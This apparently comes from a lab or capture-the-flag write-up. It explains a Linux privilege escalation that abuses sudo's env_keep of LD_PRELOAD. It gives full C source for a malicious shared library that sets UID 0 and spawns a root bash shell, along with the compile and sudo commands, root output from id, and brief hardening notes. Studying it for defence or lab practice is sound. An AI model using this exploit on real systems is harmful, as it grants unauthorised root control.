# LD_PRELOAD Privilege Escalation (sudo env_keep)

Used on: **Creative**

When `sudo` is configured with `env_keep+=LD_PRELOAD` in `/etc/sudoers`, the `LD_PRELOAD` variable is not stripped before executing the privileged command. A shared library placed in that variable is loaded by the dynamic linker **before any other library**, with the UID of the sudo target (root). The `_init()` constructor runs immediately on load, giving a root shell before the real program even starts.

## Prerequisites

- Shell access as a low-privilege user.
- `sudo -l` output contains **both**:
  - `env_keep+=LD_PRELOAD`
  - At least one command the user can run as root (`NOPASSWD` or with password).

```
(root) NOPASSWD: /usr/bin/ping
env_reset, env_keep+=LD_PRELOAD
```

## Exploit

```bash
# 1. Write the malicious shared library
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD"); // prevent loops in child processes
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# 2. Compile as a shared library
# -fPIC        → Position-Independent Code (required for .so)
# -shared      → produce a shared library, not an executable
# -nostartfiles → skip standard C startup routines (no main needed)
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# 3. Execute any allowed sudo command with LD_PRELOAD pointing to our library
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
# → root shell spawned
```

## Verification

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

## Defensive Notes

- Remove `env_keep+=LD_PRELOAD` from `/etc/sudoers`; `env_reset` alone is not sufficient if `env_keep` re-adds the variable.
- Prefer `env_reset` without exceptions for sensitive environments.
